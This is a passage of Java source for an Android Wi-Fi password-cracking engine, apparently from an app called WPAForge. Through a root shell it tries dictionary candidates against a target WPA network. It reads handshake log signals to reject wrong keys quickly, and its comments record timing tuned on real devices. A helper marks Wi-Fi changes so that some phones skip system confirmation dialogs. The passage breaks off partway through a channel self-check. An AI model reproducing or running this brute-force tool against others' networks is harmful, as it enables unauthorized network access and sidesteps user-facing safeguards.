package io.github.wlmosv_png.wpaforge.audit;

import io.github.wlmosv_png.wpaforge.L;
import io.github.wlmosv_png.wpaforge.Prefs;
import io.github.wlmosv_png.wpaforge.core.NetRecord;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSpecifier;
import android.os.Build;
import android.os.SystemClock;

import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 唯一的破解引擎。
 *
 * <h3>为什么要收敛成一个引擎</h3>
 * 之前三种模式各有各的实现，各有各的判定，结果就是
 * 「同一个 bug 要在三个地方修，还修不全」—— 事实也证明了这一点：
 * 双重 onFinished、配置复用假阳性，两个 bug 都同时存在于两条通道里。
 *
 * 现在所有通道共用同一套：
 * <ul>
 *   <li>同一套 {@link Verdict} 语义</li>
 *   <li>同一套「多信号综合判定」</li>
 *   <li>同一套重试/超时/取消策略</li>
 * </ul>
 * 通道只负责「把一条候选发出去」，判定完全由引擎做。
 *
 * <h3>多信号综合判定（这是修「跳过正确答案」的关键）</h3>
 * 单一信号都不可靠：
 * <pre>
 *   cmd wifi status 文本   可能被截断、格式随版本变
 *   onAvailable 回调       某些 ROM 会因为别的网络触发
 *   WifiInfo.getSSID()     Android 10+ 受限，更新有延迟
 * </pre>
 * 所以判定同时看**三个信号**，任一确认即成功，全部否才判失败：
 * <ol>
 *   <li>通道回调（requestNetwork 的 onAvailable）</li>
 *   <li>WifiInfo 的当前 SSID</li>
 *   <li>cmd wifi status 文本（有 shell 通道时）</li>
 * </ol>
 *
 * <h3>对外用法</h3>
 * <pre>
 *   CrackEngine engine = new CrackEngine(ctx, Prefs.MODE_ROOT);
 *   engine.run(target, candidates, startOffset, listener);
 * </pre>
 * 通道由调用方用 setShellChannel 接入；现在只有 Root 一种。
 */
public final class CrackEngine {

    private static final String TAG = "WPAForgeEngine";

    // ------------------------------------------------------------------ 结果

    /** 单条候选的结论 */
    public enum Verdict {
        /** 系统确认连上 → 密码正确 */
        SUCCESS,
        /** 系统尝试后失败 → 密码错误 */
        AUTH_FAIL,
        /** 超时，没等到结论 → **不判成功** */
        TIMEOUT,
        /**
         * 目标不在扫描范围 → 这条无意义。
         *
         * <p><b>当前没有生产出口</b>（历史遗留，仅测试引用）。保留是因为枚举是
         * 内部契约、删除会影响既有测试；但**不要假设它会出现** ——
         * 目标消失目前表现为 {@link #TIMEOUT} 或 {@link #UNKNOWN}。
         */
        TARGET_GONE,
        /**
         * 当前确实连着目标，但**无法确认是不是这条候选造成的**。
         *
         * 例如：开跑前就连着、或者上一条的连接还没断开。
         * 这种状态**不能算命中** —— 否则任何密码都会在第一条被误报成功。
         */
        UNKNOWN,
        /** 通道出错 */
        ERROR,
        /** 用户停止 */
        ABORTED
    }

    public static final class Attempt {
        public final String password;
        public final Verdict verdict;
        public final long elapsedMs;
        /** 结论描述。由 {@link #tryOne} 统一追加窗口元数据，故非 final。 */
        public String detail;
        /** 哪一个信号确认的（排查用） */
        public final String confirmedBy;
        /**
         * 本条候选的尝试标识（{@code runId#序号}）。
         *
         * <p>空串 = **没有拿到有效标识**（未接线 / 非法 / 过期），这是一个
         * 显式无效状态，不允许被下游当成「某条合法尝试」。由 {@link #tryOne} 回填。
         */
        public String attemptId = "";
        /**
         * 窗口结束时的**归类码**（机器可读）：{@code not-attempted} /
         * {@code on-target-unattributed} / {@code netid-conflict} /
         * {@code channel-no-response} / {@code status-unclear} / {@code no-evidence}。
         * 循环内提前结案的出口用 {@link #confirmedBy} 表示触发规则，此处留空。
         */
        public String reason = "";
        /**
         * 日志窗口元数据（R6）。{@code null} = 本阶段未采集。
         *
         * <p><b>只作证据质量标注</b>：它不参与任何成功/失败判定。
         * {@code evidenceUsable()} 为真是「允许进一步评估日志证据」的必要条件，
         * 不是充分条件；为假也不等于认证失败。由 {@link #tryOne} 回填。
         */
        public AttemptMarker.Window logWindow;

        Attempt(String password, Verdict v, long ms, String detail, String confirmedBy) {
            this.password = password;
            this.verdict = v;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
            this.confirmedBy = confirmedBy == null ? "" : confirmedBy;
        }

        public boolean isSuccess() { return verdict == Verdict.SUCCESS; }
    }

    /** 进度回调 */
    public interface Listener {
        void onAttemptStart(int index, int total, String candidate);
        void onAttemptResult(Attempt a);
        void onProgress(int tested, int total, double rate, long etaMs);
        default void onLog(String line) { }
        void onFinished(int tested, int total, String hitPassword, String outcome);
        void onBlocked(String title, String detail);
    }

    // ------------------------------------------------------------------ 成员

    private final Context appCtx;
    private final WifiManager wifi;
    private final int mode;
    /** 连接选项（设置页两个开关），构造时读一次 */
    private final boolean pinBssid;
    private final boolean macRotate;

    /**
     * （已弃用）曾经用作"判为成功的最短耗时"。
     *
     * 移除原因：它误杀了快速连接。
     * 归因已经由「事件必须发生在命令之后」保证，再加时间门槛是多余且有害的。
     * 保留常量只为兼容历史测试，实际判定不再使用。
     */
    @Deprecated
    private static final long MIN_HIT_MS = 0L;


    private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
    private final AtomicBoolean pauseFlag = new AtomicBoolean(false);

    /**
     * 连接事件监听器 —— **判定层的唯一真值来源**。
     *
     * 不再轮询 `WifiInfo` / 解析 `cmd wifi status` 文本，
     * 而是让系统在网络可用的**那一刻**主动通知我们。
     */
    private NetworkWatcher watcher;

    /**
     * 认证失败**系统广播**监听器（第三级早退的信号源，2026-10-23 新增）。
     *
     * 与日志判据的区别：它走 framework 广播，**不依赖 logcat**，
     * 因此不受系统日志配额影响（实测日志有时 0 行，是早退失效的主因）。
     */
    private WifiAuthFailureWatcher authWatch;

    /** shell 通道（Root），null 表示没接上 */
    private ShellChannel shell;

    /** 通道测速：连续 N 条都超时，说明这个通道在当前环境跑不动 */
    private int consecutiveTimeouts = 0;

    /** 日志检查用计数器（每 5 轮查一次，避免频繁起进程） */
    private int logCheckCounter = 0;

    // ---- R6：尝试身份（只作记录与追溯，不参与判定）----------------------
    /** 本次任务的 runId；null = 尚未生成或生成失败。 */
    private volatile String currentRunId;
    /** 同进程内第几次任务（保证同秒启动也不重号）。 */
    private int runOrdinal = 0;
    /**
     * 外部预设的 runId（R7 续跑用）。
     *
     * <p>续跑时由服务层用 {@code AttemptId.adoptForResume} 生成新 runId 并预置进来，
     * 好处是**血缘**（previousRunId）只在服务层记录一次，引擎仍是单一事实来源。
     * 绝不允许用它复用旧 runId —— 由 {@code adoptForResume} 保证新 id 不同。
     */
    private volatile String presetRunId;
    /** 取本次运行的标识（null = 还没开始跑）。 */
    public String currentRunId() { return currentRunId; }
    /** 预置本次运行的标识；传 null 清除（下次 run() 自行生成）。 */
    public void presetRunId(String runId) {
        this.presetRunId = AttemptId.wellFormedRunId(runId) ? runId : null;
    }
    /** 最近一次尝试的日志窗口元数据（由 tryOne 回填到 Attempt）。 */
    private volatile AttemptMarker.Window lastWindow;
    private static final int TIMEOUT_ALERT = 5;

    public CrackEngine(Context ctx, int mode) {
        this.appCtx = ctx.getApplicationContext();
        this.watcher = new NetworkWatcher(appCtx);
        this.authWatch = new WifiAuthFailureWatcher(appCtx);
        this.wifi = (WifiManager) appCtx.getSystemService(Context.WIFI_SERVICE);
        this.mode = mode;
        this.pinBssid = Prefs.pinBssid(appCtx);
        this.macRotate = Prefs.macRotate(appCtx);
    }

    // ------------------------------------------------------------------ 通道

    /** shell 通道抽象 */
    public interface ShellChannel {
        String exec(String cmd, long timeoutMs);
        void forgetTarget(String ssid);
        String name();
        /** 收尾钩子：常驻会话（su -c sh）必须在这里关掉，别把 root shell 留在后台。 */
        default void close() {}
    }

    public void setShellChannel(ShellChannel ch) {
        this.shell = ch;
    }

    /**
     * 供「连接自测」用：对指定 SSID+密码跑一次完整判定。
     *
     * 与正式破解走同一条路径（tryOne），只是 SSID 和密码由界面直接给出。
     */
    /**
     * 第二级早退的静默窗口（毫秒）。
     *
     * <p>真机实测（2026-10-23，B214）：正确密码从「命令发出」到「四条件成立（拿到 IP）」
     * 只要 670~722 ms；M2 是在 M1 之后约 4ms 发出的，AP 的 M3/M4 紧随其后。
     * 而错误密码时，AP 要等到 **1.0 秒后**才重发 M1。
     *
     * <p><b>阈值 600 → 1200（2026-10-24 实机事故）</b>：正确密码的「四条件成立」
     * 要等 DHCP 拿地址，实测一次命中共用 1368ms —— M1 之后到四条件成立只差
     * 几十毫秒就可能被 600ms 的静默判据抢先判成「密码错」，于是**对着正确的
     * 密码跳过去**（用户报的正是这个）。1200ms 留足余量：真密码错时，
     * M1 重发判据（M1+0.96s）通常先命中，代价只是「日志配额把重发行丢掉的
     * 少数情况」多等约 0.6 秒。
     *
     * <p>代价说明：本判据在极端拥塞的 AP 上可能把**正确**密码误判为失败（只会漏判，
     * 绝不会误判成功）——与本项目「宁可漏判，不可误判」的一贯取舍一致。
     */
    public static final long EARLY_FAIL_SILENCE_MS = 1200L;

    /**
     * 第二级早退判据（纯函数，便于离线单测）。
     *
     * @param m1Seen       本次尝试已见到 M1（RX message 1 of 4-Way Handshake）
     * @param negotiated   已见到属于目标的握手完成（Key negotiation completed）
     * @param msSinceM1    距首次看到 M1 的毫秒数
     * @param silenceMs    静默窗口阈值
     */
    public static boolean m1SilentImpliesWrongKey(boolean m1Seen, boolean negotiated,
                                                  long msSinceM1, long silenceMs) {
        return m1Seen && !negotiated && msSinceM1 >= silenceMs;
    }

    /**
     * 早退判据的**纯函数**形式（便于离线单测）。
     *
     * <p>规则：本次尝试里 M1 被重发（收到 ≥2 次 "RX message 1 of 4-Way Handshake"）
     * 且没有出现属于目标的握手完成证据 → 密码必然错误。
     *
     * <p>真机依据（2026-10-23，ColorOS 15）：M1#2 稳定出现在 M1#1 + 0.96 秒；
     * 正确密码不会产生重发的 M1（M1#1 后 ~200ms 内即走 M3/M4）。
     *
     * @param m1Count     本次尝试里收到 M1 的次数
     * @param successSeen 是否已看到**属于目标 BSSID** 的握手完成（Key negotiation completed）
     */
    /**
     * 每条候选的耗时分解串（定位「时快时慢」用）。
     * 形如 {@code  [关联 5200ms / M1 5400ms / 广播 -] }
     */
    static String timing(long tAssocMs, long tM1Ms, long tAuthMs) {
        return "  [关联 " + (tAssocMs < 0 ? "-" : tAssocMs + "ms")
                + " / M1 " + (tM1Ms < 0 ? "-" : tM1Ms + "ms")
                + " / 广播 " + (tAuthMs < 0 ? "-" : tAuthMs + "ms") + "]";
    }

    /**
     * 一条候选的判词短标签，用于收尾那条「最近判定」尾巴（纯函数，可测）。
     *
     * <p>形如 {@code sample-pw=✗m1silent} / {@code password=✓wpalog} / {@code x=超时}。
     * 为什么要这个：2026-10-24 用户报「明明正确的密码被跳过去」，而**文件日志里
     * 一条判词都没有**（逐条结果只走界面回调），查不动。现在每次跑完没命中，
     * 最后 6 条的判词会写进文件日志，这种事自己就能说清。
     */
    /**
     * 候选是否是**可尝试**的口令（WPA-PSK 要求 8..63 个字符）。纯函数，可离线测。
     *
     * <p>字典装载侧已有三处同规则过滤（{@code DictStore:336} / {@code DictStore:399} /
     * {@code DictGenerator:57}），这里是判定链入口的**防御性校验**：任何绕过上游过滤的
     * 候选都必须落到「未尝试」，而不是「密码错误」。
     */
    public static boolean isValidLength(String password) {
        return password != null && password.length() >= 8 && password.length() <= 63;
    }

    /**
     * 带尝试标识的判词（R6）：让每条判词都能追到具体尝试。
     *
     * <p>标识缺失或非法时输出 {@code <id-invalid>} —— **显式无效**，
     * 不允许悄悄省略、也不允许退化成某个合法 id。
     */
    public static String verdictTag(String attemptId, int index, String password,
                                    Verdict v, String by) {
        String id = AttemptId.wellFormed(attemptId) ? attemptId : "<id-invalid>";
        return "[" + id + "] " + verdictTag(index, password, v, by);
    }

    public static String verdictTag(int index, String password, Verdict v, String by) {
        // 口令一律脱敏（#哈希前6(len=N)），顺序号保留 —— 顺序号是非敏感信息，
        // 却是排查时对回字典的关键（"第 11 条是哪个口令"）。
        String pw = io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(index, password);
        if (v == null) return pw + "=?";
        switch (v) {
            case SUCCESS: return pw + "=✓" + (by == null || by.isEmpty() ? "hit" : by);
            case AUTH_FAIL: return pw + "=✗" + (by == null || by.isEmpty() ? "auth" : by);
            case TIMEOUT: return pw + "=超时";
            case TARGET_GONE: return pw + "=目标不在";
            // 归因码优先：ERROR 类里既有"通道出错"，也有"候选不合法/未尝试"，
            // 只写"通道"会把后者说错。by 为空时保持原样（兼容既有断言）。
            case ERROR: return pw + "=!" + (by == null || by.isEmpty() ? "通道" : by);
            case ABORTED: return pw + "=⏹中断";
            default: return pw + "=?不明";
        }
    }

    public static boolean m1RetryImpliesWrongKey(int m1Count, boolean successSeen) {
        return !successSeen && m1Count >= 2;
    }

    public Attempt tryOneForTest(String ssid, String password, long timeoutMs) {
        io.github.wlmosv_png.wpaforge.core.NetRecord t =
                new io.github.wlmosv_png.wpaforge.core.NetRecord(
                        ssid, "", 0, 2437,
                        io.github.wlmosv_png.wpaforge.core.NetRecord.Security.WPA2,
                        false, "");
        return tryOne(t, "wpa2", password, timeoutMs);
    }

    /** 供界面做环境诊断时取当前通道（可能为 null）。 */
    public ShellChannel getShellChannelForDiag() {
        return shell;
    }

    // -------------------------------------------------- 观察窗口结束后的归类（纯函数）

    /** 看门狗到期时的归类结果：业务结论 + 机器可读的理由码。 */
    public static final class DeadlineOutcome {
        public final Verdict verdict;
        /**
         * 理由码：{@code not-attempted} / {@code on-target-unattributed} /
         * {@code netid-conflict} / {@code channel-no-response} /
         * {@code status-unclear} / {@code no-evidence}。
         */
        public final String reason;

        DeadlineOutcome(Verdict v, String r) { this.verdict = v; this.reason = r; }
    }

    /**
     * 观察窗口（看门狗）结束时的归类 —— **纯逻辑，可离线逐格穷举**。
     *
     * <h3>R3 的关键修正：到期 ≠ 密码错</h3>
     * 旧实现在「等满时限、什么都没观察到」时也返回 {@code AUTH_FAIL}，
     * 等于把「没有成功证据」当成「失败已被证明」。那条路径在整个引擎里
     * 是**唯一**会产出「无证据失败结论」的地方，故单独抽成纯函数钉死。
     *
     * <p>现在它返回 {@link Verdict#TIMEOUT}（观察窗口结束、没有明确结论），
     * 与「有可归因失败证据的 {@code AUTH_FAIL}」严格区分；
     * 该值早已在枚举、判词标签与消费方（{@code BackoffPolicy} 明确把它排除在
     * 「AP 的响应样本」之外）中存在，本次只是**给它接上真实生产路径**。
     *
     * @param notAttempted         命令未生效、本条候选没有被有效执行
     * @param onTargetNow          结束时仍显示连着目标（无本次归属证据）
     * @param suspectNetIdConflict 见过目标已连但与本次新建配置的 netId 不符
     * @param channelDead          未见尝试且通道无响应
     * @param statusShowsTarget    通道正常但结束时 status 显示目标、证据不足
     */
    public static DeadlineOutcome classifyDeadline(boolean notAttempted, boolean onTargetNow,
                                                   boolean suspectNetIdConflict,
                                                   boolean channelDead,
                                                   boolean statusShowsTarget) {
        if (notAttempted) return new DeadlineOutcome(Verdict.ERROR, "not-attempted");
        if (onTargetNow) return new DeadlineOutcome(Verdict.UNKNOWN, "on-target-unattributed");
        if (suspectNetIdConflict) return new DeadlineOutcome(Verdict.UNKNOWN, "netid-conflict");
        if (channelDead) return new DeadlineOutcome(Verdict.UNKNOWN, "channel-no-response");
        if (statusShowsTarget) return new DeadlineOutcome(Verdict.UNKNOWN, "status-unclear");
        return new DeadlineOutcome(Verdict.TIMEOUT, "no-evidence");
    }

    // ------------------------------------------------------------------ 前置检查

    public static final class CheckResult {
        public final boolean ok;
        public final String title;
        public final String detail;
        public CheckResult(boolean ok, String title, String detail) {
            this.ok = ok;
            this.title = title;
            this.detail = detail == null ? "" : detail;
        }
    }

    /** 引擎在当前模式下能不能跑 */
    public CheckResult check() {
        if (wifi == null) {
            return new CheckResult(false,
                    L.s("无法访问 WiFi 服务", "Cannot access the Wi-Fi service"),
                    L.s("系统没有提供 WifiManager。", "The system exposed no WifiManager."));
        }
        if (!wifi.isWifiEnabled()) {
            return new CheckResult(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    L.s("请先打开 WiFi 开关再试。", "Turn Wi-Fi on first."));
        }
        return new CheckResult(true, "", "");
    }

    // ------------------------------------------------------------------ 判定核心

    /**
     * 当前是不是真的连着目标。
     *
     * 三个信号任一确认即算，返回确认者的名字；都不确认返回 null。
     * 这个方法是整个引擎可靠性的关键 —— 单看任何一个都会误判。
     */
    private String connectedSignal(String targetSsid, String statusOut) {
        // 信号 1：WifiInfo
        String cur = currentSsid();
        if (cur != null && cur.equals(targetSsid)) return "WifiInfo";

        // 信号 2：cmd wifi status 文本
        if (statusOut != null && statusOut.contains("connected to \"" + targetSsid + "\"")) {
            return "cmd-status";
        }

        return null;
    }

    /**
     * 把 CHANGE_WIFI_STATE 的操作登记为本应用发起。
     *
     * 这是「减少系统弹窗」的一环：系统在决定要不要弹确认框时，
     * 会看这次 Wi-Fi 操作是谁发起的、有没有走应用自己的前台界面。
     * 用 AppOps 标记之后，部分 ROM（含 ColorOS）会直接静默处理。
     *
     * 失败不影响功能，只是弹窗可能还在。
     */
    /** change_wifi_state 的 AppOps 名（字符串常量，避免不同版本字段缺失） */
    private static final String OP_CHANGE_WIFI = "android:change_wifi_state";

    private void noteAppOpAllow() {
        try {
            android.app.AppOpsManager ops = (android.app.AppOpsManager)
                    appCtx.getSystemService(Context.APP_OPS_SERVICE);
            if (ops == null) return;
            // 不同版本方法名不同，逐个试
            try {
                ops.noteOp(OP_CHANGE_WIFI,
                        android.os.Process.myUid(), appCtx.getPackageName());
            } catch (Throwable t1) {
                try {
                    java.lang.reflect.Method m = android.app.AppOpsManager.class
                            .getMethod("noteOpNoThrow", String.class, int.class, String.class);
                    m.invoke(ops, OP_CHANGE_WIFI,
                            android.os.Process.myUid(), appCtx.getPackageName());
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    /** 当前 SSID（已去引号） */
    private String currentSsid() {
        // **优先走 shell 的 `cmd wifi status`。**
        //
        // 缺定位权限时，App 侧的 `WifiInfo.getSSID()` 永远返回
        // `<unknown ssid>`。而这里的返回值被大量判定与防护逻辑用到：
        //   · 基线断开确认（disconnectAndVerify）
        //   · 命令前 SSID（ssidBefore）
        //   · 判据 D
        // 一旦恒为 null，这些防护会**静默失效**（例如「命令前不是目标」
        // 会被判成成立），假阳性就从这里漏出来。
        // shell 侧不受定位权限影响，读得到就读它。
        if (shell != null) {
            try {
                String st = shell.exec("cmd wifi status", 5000);
                if (st != null && !st.trim().isEmpty()) {
                    String cur = StatusParser.currentSsid(st);
                    if (cur != null && !"<unknown ssid>".equals(cur)) return cur;
                    // status 明确说没连，就直接返回 null，不要再退回 App API
                    if (st.contains("Wifi is not connected")) return null;
                }
            } catch (Throwable ignored) {}
        }
        try {
            if (wifi == null) return null;
            WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return null;
            String cur = info.getSSID();
            if (cur == null) return null;
            if (cur.length() >= 2 && cur.startsWith("\"") && cur.endsWith("\"")) {
                cur = cur.substring(1, cur.length() - 1);
            }
            if ("<unknown ssid>".equals(cur)) return null;
            return cur;
        } catch (Throwable t) {
            return null;
        }
    }

    // ------------------------------------------------------------------ 连接状态与基线

    /**
     * 当前是否连着某个网络（返回 SSID，没连返回 null）。
     *
     * 注意：这里读的是**系统级的当前连接**，它可能是：
     *   · 用户自己连的
     *   · 上一条候选留下的
     *   · 本条候选刚建立的
     * 单看这个值**无法区分**，所以不能直接当命中依据。
     */
    private String snapshotSsid() {
        return currentSsid();
    }

    /**
     * 解析 `cmd wifi status` 输出，判断当前是否连着目标、以及 netId。
     * 实现已抽到 {@link StatusParser}（纯逻辑，可离线测试）。
     */
    public static long[] parseStatusFor(String statusOut, String ssid) {
        StatusParser.Result r = StatusParser.parse(statusOut, ssid);
        return new long[]{r.onTarget ? 1 : 0, r.netId};
    }

    /**
     * 当前连接的 netId。
     *
     * **优先走 shell 的 `cmd wifi status`**：App 侧的
     * `WifiInfo.getNetworkId()` 在「正在连接」状态下会返回 -1 或过期的值，
     * 而判定恰恰最需要在那一刻拿到真实 netId（用来确认是不是本次新建的配置）。
     * shell 拿不到时才退回本地 API。
     */
    private long currentNetId() {
        if (shell != null) {
            try {
                String st = shell.exec("cmd wifi status", 5000);
                if (st != null && !st.trim().isEmpty()) {
                    long id = StatusParser.parse(st, null).netId;
                    if (id >= 0) return id;
                }
            } catch (Throwable ignored) {}
        }
        try {
            if (wifi == null) return -1;
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return -1;
            int id = info.getNetworkId();
            return id < 0 ? -1 : id;
        } catch (Throwable t) {
            return -1;
        }
    }

    /**
     * 引擎自带的「删净目标配置」实现。
     *
     * 不依赖外部传入的 {@link ShellChannel#forgetTarget} —— 那个实现在
     * 不同调用方（前台服务 / 自检 / 连接自测）里有的做了回读校验、
     * 有的干脆是空实现，行为不一致。判定依赖「配置确实被清掉」，
     * 所以统一收在这里，谁调都一样。
     *
     * @return true = 确认已清干净
     */
    private boolean forgetTargetByShell(String ssid) {
        if (shell == null || ssid == null) return false;
        // 两轮足够：第一轮删净即返回；第二轮兜「删了又被系统重建」的罕见情况。
        // 原来每轮是「删一次 + sleep(400) + 下轮再查」，现在把「删 + 等 0.3s + 回读」
        // 压进同一次 shell 调用 —— 省掉一次进程启动和一个固定 sleep。
        for (int round = 0; round < 2; round++) {
            long leftover = -1;
            try {
                String out = shell.exec("cmd wifi list-networks", 5000);
                if (out == null) return false;
                leftover = netIdIn(out, ssid);
            } catch (Throwable ignored) {
                return false;
            }
            if (leftover < 0) return true;
            try {
                // sleep 0.3 → 0.15（2026-10-23 实测）：这一步是「删 + 等 + 回读」，
                // 等的是让 framework 把删除落定。实测 0.05s 就已经读不到了（5/5 干净），
                // 取 0.15 留 3 倍余量 —— 万一真读回旧配置，下面的校验会让它多跑一轮
                // （只是慢，不会误判），所以这条可以放心压。
                String out2 = shell.exec("cmd wifi forget-network " + leftover
                        + "; sleep 0.15; cmd wifi list-networks", 6000);
                if (out2 != null && netIdIn(out2, ssid) < 0) return true;
            } catch (Throwable ignored) {}
        }
        return netIdOfTarget(ssid) < 0;
    }

    /** 从 `cmd wifi list-networks` 输出里找目标的 netId；找不到返回 -1。 */
    private long netIdIn(String out, String ssid) {
        if (out == null || ssid == null) return -1;
        for (String line : out.split("\n")) {
            Long id = parseNetIdLine(line, ssid);
            if (id != null) return id;
        }
        return -1;
    }

    /**
     * 查目标是本次新建网络的 netId（命令后用）。
     *
     * `cmd wifi connect-network` 会把目标写进已保存列表，
     * 命令后查到的 netId 就是**本次**配置的净标识。
     * 用它和 status 里的 Net ID 比对，就能把「连上了目标」归因到「这条候选」。
     */
    private long netIdOfTarget(String ssid) {
        if (shell == null || ssid == null || ssid.isEmpty()) return -1;
        try {
            String out = shell.exec("cmd wifi list-networks", 5000);
            if (out == null) return -1;
            for (String line : out.split("\n")) {
                Long id = parseNetIdLine(line, ssid);
                if (id != null) return id;
            }
        } catch (Throwable ignored) {}
        return -1;
    }

    /**
     * 从 `cmd wifi list-networks` 的一行里解析出 netId。
     * 实现已抽到 {@link ListNetworksParser}（纯逻辑，可离线测试）。
     */
    public static Long parseNetIdLine(String line, String ssid) {
        return ListNetworksParser.netIdOfLine(line, ssid);
    }

    /**
     * 断开当前连接，并确认真的断开了。
     *
     * 这是「基线」步骤：只有基线是「未连接目标」，
     * 后面的「连上了」才有意义。
     */
    private boolean disconnectAndVerify(String targetSsid) {
        // 先用本地 API
        try {
            if (wifi != null) wifi.disconnect();
        } catch (Throwable ignored) {}

        // **不能一看到“不是目标”就算断开成功**。
        // 断开瞬间 SSID 会变成 null / <unknown>，但系统可能马上又自动连回去（
        // 已保存的配置还在）。要“持续一段时间都没连目标”才能认。
        long stableSince = -1;
        for (int i = 0; i < 40; i++) {          // 最长 12 秒
            String cur = snapshotSsid();
            boolean off = (cur == null || !cur.equals(targetSsid));
            if (off) {
                if (stableSince < 0) stableSince = SystemClock.uptimeMillis();
                // 连续 3 秒未连目标 → 认为基线稳定
                if (SystemClock.uptimeMillis() - stableSince >= 3000) return true;
            } else {
                stableSince = -1;
            }
            sleep(300);
        }

        // 本地 API 不生效就走 shell（有通道的话）
        if (shell != null) {
            try { shell.exec("cmd wifi set-wifi-enabled disabled", 5000); } catch (Throwable ignored) {}
            sleep(1200);
            try { shell.exec("cmd wifi set-wifi-enabled enabled", 5000); } catch (Throwable ignored) {}
            for (int i = 0; i < 15; i++) {
                String cur = snapshotSsid();
                if (cur == null || !cur.equals(targetSsid)) return true;
                sleep(400);
            }
        }
        return false;
    }

    // ------------------------------------------------------------------ 通道自检

    /** 接入自检结果 */
    public static final class ChannelProbe {
        public final boolean ok;
        public final String summary;
        public final String detail;
        /** 逐项检查结果，给用户看细节 */
        public final java.util.List<String> steps = new java.util.ArrayList<>();

        ChannelProbe(boolean ok, String summary, String detail) {
            this.ok = ok;
            this.summary = summary == null ? "" : summary;
            this.detail = detail == null ? "" : detail;
        }

        /** 连同已收集的步骤一起构造。
         *
         * 之前 probeChannel 里先在临时对象上 step()，最后 new 了一个新对象返回 ——
         * detail（字符串）带过去了，但 steps（列表）留在了临时对象上，
         * 于是日志里出现「结论有、检查项 0 条」的怪现象。
         */
        ChannelProbe(boolean ok, String summary, String detail, java.util.List<String> from) {
            this(ok, summary, detail);
            if (from != null) this.steps.addAll(from);
        }

        void step(String s) { steps.add(s); }
    }

    /**
     * 检查当前通道是不是真的接入了。
     *
     * 这是用户要求的「完全判定」：不看界面写着什么，
     * 而是**实际跑一遍判定链**，每一步都留证据。
     *
     * <p>为什么必须做这个：设置里显示的模式只是 prefs 里存的一个数字，
     * 跟通道是否真的可用完全无关。之前没有自检，
     * 通道断了也照跑，跑完 97 条全是「未连上」，用户以为密码不对。
     */
    public ChannelProbe probeChannel() {
        ChannelProbe p = new ChannelProbe(true, "", "");

        // --- 1. WiFi 开关 ---
        boolean wifiOn = false;
        try { wifiOn = wifi != null && wifi.isWifiEnabled(); } catch (Throwable ignored) {}
        p.step((wifiOn ? "✓ " : "✗ ") + L.s("WiFi 开关: ", "Wi-Fi enabled: ")
                + (wifiOn ? L.s("开", "on") : L.s("关", "off")));
        if (!wifiOn) {
            p.step(L.s("  → 请先打开 WiFi", "  -> turn Wi-Fi on first"));
            return new ChannelProbe(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    join(p), p.steps);
        }

        // --- 2. 通道类型：只有 Root ---
        if (shell == null) {
            p.step("✗ " + L.s("shell 通道未设置", "shell channel not set"));
            return new ChannelProbe(false,
                    L.s("通道未接入", "channel not attached"),
                    join(p) + "\n" + L.s("这是程序内部错误，请反馈。",
                            "This is an internal error; please report it."));
        }
        p.step("✓ " + L.s("通道类型: ", "channel type: ") + shell.name());

        // 真跑一条，看能不能执行
        String out = null;
        long t0 = SystemClock.uptimeMillis();
        try {
            out = shell.exec("cmd wifi status", 8000);
        } catch (Throwable t) {
            p.step("✗ " + L.s("执行命令抛异常: ", "exec threw: ") + t.getClass().getSimpleName());
        }
        long cost = SystemClock.uptimeMillis() - t0;

        if (out == null) {
            p.step("✗ " + L.s("命令没有返回（通道断了或未授权）",
                    "command returned nothing (channel down or not granted)"));
            p.step("  " + L.s("耗时 ", "took ") + cost + "ms");
            return new ChannelProbe(false,
                    L.s("通道未真正接入", "channel is not actually attached"),
                    join(p) + "\n\n" + L.s(
                            "「执行方式」里显示的模式只是设置项，不代表通道可用。\n"
                                    + "请到设置页点那行状态重新检测，并确认本应用已获得 root 授权。",
                            "The mode shown in Settings is just a preference; it does not mean "
                                    + "the channel works. Re-check the status line on the Settings page, "
                                    + "and make sure this app has root access."));
        }

        String trimmed = out.trim();
        if (trimmed.isEmpty()) {
            p.step("✗ " + L.s("命令返回空（通道没真正执行）",
                    "command returned empty (channel did not actually run)"));
            return new ChannelProbe(false,
                    L.s("通道未真正接入", "channel is not actually attached"),
                    join(p) + "\n\n" + L.s(
                            "常见原因：su 未授权本应用，或命令被系统限制。",
                            "Common causes: su was not granted to this app, or the command is blocked."));
        }

        boolean looksLikeWifi = trimmed.contains("Wifi") || trimmed.contains("Wi-Fi")
                || trimmed.contains("wlan") || trimmed.contains("connected");
        p.step((looksLikeWifi ? "✓ " : "? ") + L.s("命令返回看起来像 WiFi 输出", "output looks like Wi-Fi status"));
        p.step("  " + L.s("耗时 ", "took ") + cost + "ms");
        if (!looksLikeWifi) {
            p.step("  " + L.s("首行: ", "first line: ") + firstLine(trimmed));
        }

        // --- 4. 判定信号可用性 ---
        String cur = currentSsid();
        p.step((cur != null ? "✓ " : "· ") + L.s("WifiInfo 信号: ", "WifiInfo signal: ")
                + (cur == null ? L.s("读不到", "unavailable") : cur));
        boolean cmdSignal = trimmed.contains("connected to \"");
        p.step((cmdSignal ? "✓ " : "· ") + L.s("cmd-status 信号: ",
                "cmd-status signal: ")
                + (cmdSignal ? L.s("可用（当前已连着网络）", "usable (connected now)")
                             : L.s("当前没连网络，连上后才有", "no network connected right now")));

        if (cur == null && !cmdSignal) {
            p.step(L.s("  ⚠ 两个判定信号当前都读不到值。",
                    "  ! both verdict signals read nothing right now."));
            p.step(L.s("    这不一定是故障（可能只是当前没连网），",
                    "    This is not necessarily a fault (you may just be offline),"));
            p.step(L.s("    但如果跑完所有候选都没命中，请先怀疑这里。",
                    "    but if every candidate misses, suspect this first."));
        }

        if (cost > 5000) {
            p.step(L.s("  ⚠ 命令较慢，判定会拖时间（不影响正确性）",
                    "  ! command is slow; verdicts will lag (correctness unaffected)"));
        }

        // **慢不等于不可用**。
